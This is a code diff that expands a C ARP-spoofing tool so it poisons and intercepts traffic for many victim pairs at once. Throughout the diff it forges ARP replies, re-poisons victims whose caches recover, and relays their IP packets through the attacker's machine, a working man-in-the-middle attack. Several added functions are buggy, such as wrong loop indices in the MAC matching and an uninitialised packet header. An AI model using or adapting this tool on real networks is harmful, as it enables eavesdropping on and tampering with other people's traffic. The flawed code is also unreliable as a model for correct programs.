@@ -39,20 +39,20 @@ typedef struct arp_packet
 #define BROADCAST "\xff\xff\xff\xff\xff\xff"
 #define UNKNOW "\x00\x00\x00\x00\x00\x00"
 #define ETHERNET 0x0100
-int flag = 0;
+int count;
 char *dev;
-char *sender_ip_string;
-char *target_ip_string;
+char *sender_ip_string[30];
+char *target_ip_string[30];
 unsigned char my_ip[4];
 unsigned char my_mac[6] = {0, };
-unsigned char sender_ip[4];
-unsigned char sender_mac[6] = { 0, };
-unsigned char target_ip[4] = { 0, };
-unsigned char target_mac[6] = { 0, };
+unsigned char sender_ip[30][4];
+unsigned char sender_mac[30][6] = { 0, };
+unsigned char target_ip[30][4] = { 0, };
+unsigned char target_mac[30][6] = { 0, };
 arp_packet *buf;
-arp_packet *infect_sender_packet;
-arp_packet *infect_target_packet;
-pthread_t thread_list[4];
+arp_packet *infect_sender_packet[30];
+arp_packet *infect_target_packet[30];
+pthread_t thread_list[30];
 
 void usage() {
 printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -74,7 +74,7 @@ void convert_mac(const char *data, unsigned char *result, int sz)
 	} while( (stp = strtok( NULL , ":" )) != NULL );
 }
 
-int GetMacAddress(const char *ifr, unsigned char *mac)
+int GetMyMacAddress(const char *ifr, unsigned char *mac)
 {
 	int sock;
 	struct ifreq ifrq;
@@ -99,7 +99,7 @@ int GetMacAddress(const char *ifr, unsigned char *mac)
 
 }
 
-int GetIpAddress(const char *ifr, unsigned char *ip)
+int GetMyIp(const char *ifr, unsigned char *ip)
 {  
 	int sockfd;  
 	struct ifreq ifrq; 
@@ -181,6 +181,7 @@ int check_ip(const u_char *packet, unsigned char *dest_ip)
 
 	if( packet_arp->src_ip[0] == dest_ip[0] &&  packet_arp->src_ip[1] == dest_ip[1] && packet_arp->src_ip[2] == dest_ip[2] && packet_arp->src_ip[3] == dest_ip[3] )
 		return 1;
+	
 
 	return 0;
 }
@@ -197,14 +198,14 @@ int check_is_arp(const u_char *packet)
 	return 0;
 }
 
-void GetSenderMac(arp_packet *buf, unsigned char *dest_ip, unsigned char *sender_mac)
+void GetMacAddr(arp_packet *buf, unsigned char *dest_ip, unsigned char *sender_mac)
 {
 	pcap_t *recv;
 	int flag = 0;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	struct pcap_pkthdr *header;
 	const u_char *packet;
-	int res;
+	int res, cnt = 0;
 
 	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 
@@ -212,9 +213,12 @@ void GetSenderMac(arp_packet *buf, unsigned char *dest_ip, unsigned char *sender
 	{
 			recv = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 		
-			if( pcap_sendpacket(handle, (const u_char *)buf, sizeof(arp_packet)) == -1)
+			if(cnt % 100 == 0)
+				if( pcap_sendpacket(handle, (const u_char *)buf, sizeof(arp_packet)) == -1)
 		                printf("Send Failed...\n");
 
+			cnt++;
+			
 			pcap_next_ex(recv, &header, &packet);
 			res = pcap_next_ex(recv, &header, &packet);
 			
@@ -266,30 +270,45 @@ void infect_arp(void *infect_sender_packet)
 	pcap_close(handle);
 }
 
-void *infect_sender_loop(void *)
+void *infect_loop(void *)
 {
-	while(flag == 0)
+	printf("[*]Loop\n");
+	while( true )
     {
+		for(int i = 0; i < count; i++)
+		{
+			infect_arp(infect_sender_packet[i]);
+			infect_arp(infect_target_packet[i]);
+		}
 		sleep(60);
-		infect_arp(infect_sender_packet);
     }
 }
 
 void *command(void *)
 {
-	char cmd[5];
+	char cmd[32];
+	char *input = "$ ";
+	int length;
+	printf("[*]Input the Command\n");
+
 	while(1)
 	{
-		printf("> ");
-		read(0, cmd, 4);
-		if( strcmp(cmd, "quit") == 0 || cmd == "q")
+		write(1, input, 2);
+		length = read(0, cmd, 32) - 1;
+
+		if(cmd[length] == 0xa) cmd[length] = 0;
+
+		if( (length == 4 && strncmp(cmd, "quit",4) == 0) || (length == 1 && strncmp(cmd, "q", 1) == 0) || (length == 4 && strncmp(cmd, "exit", 4) == 0))
 			break;
+
+		printf("%s: command not found\n", (char *)cmd);
 	}
-	flag++;
-	for(int i = 0; i < 4; i++)
+
+	for(int i = 0; i <= count + 1; i++)
 		pthread_cancel(thread_list[i]); 	
 }
 
+/*
 int check_broadcast(const u_char *packet)
 {
 	struct ether_header *packet_ether;
@@ -301,17 +320,26 @@ int check_broadcast(const u_char *packet)
 	return 1;
 
 }
+*/
 
 int check_sender(const u_char *packet)
 {
 	struct ether_header *packet_ether;
 	packet_ether = (struct ether_header *)packet;
 
-	int i;
-	for(i = 0; i < 6; i++)
-		if(packet_ether->ether_shost[i] != sender_mac[i])
-			return 0;
-	return 1;
+	int i,j;
+	int match; 
+
+	for(i = 0; i < count; i++)
+	{
+		match = 0;
+		for(j = 0; j < 6; j++)
+			if(packet_ether->ether_shost[i] == sender_mac[i][j])
+				match++;
+		if(match == 6)
+			return i;
+	}
+	return 0;
 }
 
 int check_target(const u_char *packet)
@@ -319,47 +347,46 @@ int check_target(const u_char *packet)
 	struct ether_header *packet_ether;
 	packet_ether = (struct ether_header *)packet;
 
-	int i;
-	for(i = 0; i < 4; i++)
-		if(packet_ether->ether_shost[i] != target_mac[i])
-			return 0;
+	int i,j;
+	int match; 
 
-	return 1;
+	for(i = 0; i < count; i++)
+	{
+		match = 0;
+		for(j = 0; j < 6; j++)
+			if(packet_ether->ether_shost[i] == target_mac[i][j])
+				match++;
+		if(match == 6)
+			return i;
+	}
+	return 0;
 }
 
-void *check_recovery(void *)
+void check_recovery(const u_char *packet)
 {
-	char errbuf[PCAP_ERRBUF_SIZE];
-	struct pcap_pkthdr *header;
-	const u_char *packet;
-	int res;
-	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	int index;
+	
+	index = check_sender(packet);
 
-	while( true )
-	{	
-		if(flag) break;
-		res = pcap_next_ex(handle, &header, &packet);
-		if (res == -1 || res == -2) break;
+	if(index > 0)
+		infect_arp(infect_sender_packet[index]);
 
-		if(check_is_arp(packet) && check_broadcast(packet) && check_sender(packet))
-			infect_arp(infect_sender_packet);
 
-		if(check_is_arp(packet) && check_target(packet))
-			infect_arp(infect_target_packet);
-	}
+	index = check_target(packet);
 
-	pcap_close(handle);
+	if(index > 0)
+		infect_arp(infect_target_packet[index]);
 }
 
 int check_is_ip(const u_char *packet)
 {
 	struct ether_header *packet_ether;
-
+	
 	packet_ether = (struct ether_header *)packet;
-
+	
 	if(ntohs(packet_ether->ether_type) == ETHERTYPE_IP)
 		return 1;
-
+	
 	return 0;
 }
 
@@ -368,9 +395,12 @@ int sender_to_target(const u_char *packet)
 	struct iphdr *ip;
 	
 	ip = (struct iphdr *)packet;
-	if(strcmp(inet_ntoa(*(struct in_addr *)&ip->saddr), sender_ip_string) == 0 )
-		if( strcmp(inet_ntoa(*(struct in_addr *)ip->daddr), target_ip_string) == 0)
-			return 1;
+
+	for(int i = 0; i < count; i++)
+		if(strcmp(inet_ntoa(*(struct in_addr *)&ip->saddr), sender_ip_string[i]) == 0 )
+			if( strcmp(inet_ntoa(*(struct in_addr *)ip->daddr), target_ip_string[i]) == 0)
+				return i;
+
 	return 0;
 }
 
@@ -379,9 +409,10 @@ int target_to_sender(const u_char *packet)
 	struct iphdr *ip;
 
 	ip = (struct iphdr *)packet;
-	if( strcmp(inet_ntoa(*(struct in_addr *)&ip->saddr), target_ip_string) == 0) 
-		if( strcmp(inet_ntoa(*(struct in_addr *)ip->daddr), sender_ip_string) == 0)
-			return 1;
+	for(int i = 0; i < count; i++)
+		if( strcmp(inet_ntoa(*(struct in_addr *)&ip->saddr), target_ip_string[i]) == 0) 
+			if( strcmp(inet_ntoa(*(struct in_addr *)ip->daddr), sender_ip_string[i]) == 0)
+				return i;
 
 	return 0;
 }
@@ -397,117 +428,170 @@ void change_mac_addr(const u_char *packet)
 		packet_ether->ether_shost[i] = my_mac[i];
 }
 
-void *ip_packet_relay(void *)
+void ip_packet_relay(const u_char *packet)
 {
-	char errbuf[PCAP_ERRBUF_SIZE];
+	struct pcap_pkthdr *header;
+	char errbuf[PCAP_ERRBUF_SIZE];	
+	pcap_t *send_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
+	if(sender_to_target(packet))
+	{
+		change_mac_addr(packet);	
+		pcap_sendpacket(send_handle, (const u_char *)packet, header->caplen);
+	}
+
+	if(target_to_sender(packet))
+	{
+		change_mac_addr(packet);
+		pcap_sendpacket(send_handle, (const u_char *)packet, header->caplen);
+	}
+
+	pcap_close(send_handle);
+}
+
+void *spoof_thread(void *index)
+{
+	char errbuf[PCAP_ERRBUF_SIZE];	
 	struct pcap_pkthdr *header;
 	const u_char *packet;
 	int res;
 	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	pcap_t *send_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 
+	printf("[*]Thread Number %d is activate\n", index + 1);
+
 	while( true )
 	{	
-		if(flag) break;
 		res = pcap_next_ex(handle, &header, &packet);
+		sleep(0.1);
 		if (res == -1 || res == -2) break;
 
 		if(check_is_ip(packet))
-		{
-			if(sender_to_target(packet))
-			{
-				change_mac_addr(packet);	
-				printf("sender to target\n");
-				printf("size : %d\n", header->caplen); 
-				pcap_sendpacket(send_handle, (const u_char *)packet, header->caplen);
-			}
+			ip_packet_relay(packet);
+		
+		else if(check_is_arp(packet))
+			check_recovery(packet);			
 
-			if(target_to_sender(packet))
-			{
-				change_mac_addr(packet);
-				printf("target to sender\n");
-				printf("size : %d\n", header->caplen); 
-				pcap_sendpacket(send_handle, (const u_char *)packet, header->caplen);
-			}
-
-		}
+		
 	}
-
+	printf("[*]Thread Number %d is deactivate\n", index + 1);
 	pcap_close(handle);
 	pcap_close(send_handle);
+	
+}
+
+void print_info(unsigned char *ip, unsigned char *mac)
+{
+	printf(" - IP : ");
+
+	for(int i = 0; i < 3; i++)
+		printf("%03d.",ip[i]);
+
+	printf("%03d | MAC : ",ip[3]);
+
+	for(int i = 0; i < 5; i++)
+		printf("%02x:",mac[i]);
+	
+	printf("%02x\n",mac[5]);
 }
 
 int main(int argc, char *argv[]) 
 {
-	int thread_id, thread_ret;
+	int thread_ret, i;
 
 	if (argc < 3) 
 	{
 		usage();
 		return -1;
 	}
-	sender_ip_string = argv[2];
-	target_ip_string = argv[3];
+
 	arp_packet *buf = (arp_packet *)malloc(sizeof(arp_packet));
-	arp_packet *infect_sender_packet = (arp_packet *)malloc(sizeof(arp_packet));
-	arp_packet *infect_target_packet = (arp_packet *)malloc(sizeof(arp_packet));
 	dev = argv[1];
 
-	inet_pton(AF_INET, argv[2], sender_ip);
-	inet_pton(AF_INET, argv[3], target_ip);
+	count = (argc - 2) / 2;
+	printf("[*]Target count : %d\n", count);
 
-	if( GetIpAddress(argv[1], my_ip) != 1 )
+	if( GetMyIp(argv[1], my_ip) != 1 )
 	{
 		printf("Failed Get IP Address\n");
 		return 0; 
 	}
 
-	if( GetMacAddress(argv[1], my_mac) != 1 )
+	if( GetMyMacAddress(argv[1], my_mac) != 1 )
 	{
 		printf("Failed Get MAC Address\n");
 		return 0;
 	}
 
-	make_packet(buf, (unsigned char *)BROADCAST, my_mac, ARPOP_REQUEST, my_mac, my_ip, (unsigned char *)UNKNOW, sender_ip);
-	GetSenderMac(buf, sender_ip, sender_mac);
-	
-	make_packet(buf, (unsigned char *)BROADCAST, my_mac, ARPOP_REQUEST, my_mac, my_ip, (unsigned char *)UNKNOW, target_ip);
-	GetSenderMac(buf, target_ip, target_mac);
-	
-	make_packet(infect_target_packet, target_mac, my_mac, ARPOP_REPLY, my_mac, sender_ip, target_mac, target_ip);
-	make_packet(infect_sender_packet, sender_mac, my_mac, ARPOP_REPLY, my_mac, target_ip, sender_mac, sender_ip);
+	printf("[*]Success Get Local Address\n");
+	print_info(my_ip, my_mac);
 
-    if( pthread_create( &thread_list[0], NULL, infect_sender_loop, NULL ) < 0 )
-    {
-        perror("thread create error : ");
-        exit(0);
+	for(i = 0 ; i < count; i++)
+	{
+		sender_ip_string[i] = argv[i * 2 + 2];
+		target_ip_string[i] = argv[i * 2 + 3];
+
+		inet_pton(AF_INET, argv[i * 2 + 2], sender_ip[i]);
+		inet_pton(AF_INET, argv[i * 2 + 3], target_ip[i]);	
+
+		infect_sender_packet[i] = (arp_packet *)malloc(sizeof(arp_packet));
+		infect_target_packet[i] = (arp_packet *)malloc(sizeof(arp_packet));
+		
+		make_packet(buf, (unsigned char *)BROADCAST, my_mac, ARPOP_REQUEST, my_mac, my_ip, (unsigned char *)UNKNOW, sender_ip[i]);
+		GetMacAddr(buf, sender_ip[i], sender_mac[i]);
+		
+		make_packet(buf, (unsigned char *)BROADCAST, my_mac, ARPOP_REQUEST, my_mac, my_ip, (unsigned char *)UNKNOW, target_ip[i]);
+		GetMacAddr(buf, target_ip[i], target_mac[i]);
+		
+		make_packet(infect_target_packet[i], target_mac[i], my_mac, ARPOP_REPLY, my_mac, sender_ip[i], target_mac[i], target_ip[i]);
+		make_packet(infect_sender_packet[i], sender_mac[i], my_mac, ARPOP_REPLY, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
+	}
+
+	printf("[*]Success Get Sender / Receiver Address\n");
+	for(i = 0; i < count; i++)
+	{
+		print_info(sender_ip[i], sender_mac[i]);
+		print_info(target_ip[i], target_mac[i]);
+	}
+	printf("[*]Start Spoofing\n");
+
+	for(i = 0; i < count; i++)
+	{
+		if( pthread_create( &thread_list[i], NULL, spoof_thread, (void *)i ) < 0 )
+	    {
+	        perror("thread create error : ");
+	        exit(0);
+	    }
     }
 
-	if( pthread_create( &thread_list[1], NULL, check_recovery, NULL ) < 0 )
+    sleep(10);
+
+    if( pthread_create( &thread_list[count], NULL, infect_loop, NULL) < 0 )
     {
-        perror("thread create error : ");
-        exit(0);
+	        perror("thread create error : ");
+	        exit(0);
+   	}
+
+    sleep(10);
+
+    if( pthread_create( &thread_list[count + 1], NULL, command, NULL ) < 0 )
+    {
+	        perror("thread create error : ");
+	        exit(0);
     }
 
-    if( pthread_create( &thread_list[2], NULL, ip_packet_relay, NULL ) < 0 )
-    {
-        perror("thread create error : ");
-        exit(0);
-    }
+    for(i = 0; i <= count + 1; i++)
+    	pthread_join(thread_list[i], (void **)&thread_ret);
+    
+    
 
-    if( pthread_create( &thread_list[3], NULL, command, NULL ) < 0 )
-    {
-        perror("thread create error : ");
-        exit(0);
-    }
+	free(buf);
+	for(i = 0; i < count; i++)
+	{
+		free(infect_sender_packet[i]);
+		free(infect_target_packet[i]);
+	}
 
-	pthread_join(thread_list[0], (void **)&thread_ret);
-    pthread_join(thread_list[1], (void **)&thread_ret);  
-    pthread_join(thread_list[2], (void **)&thread_ret);
-    pthread_join(thread_list[3], (void **)&thread_ret);
-	
-	free(buf);	
-	free(infect_sender_packet);
-
+	printf("[*]Exit\n");
 	return 0;
 }
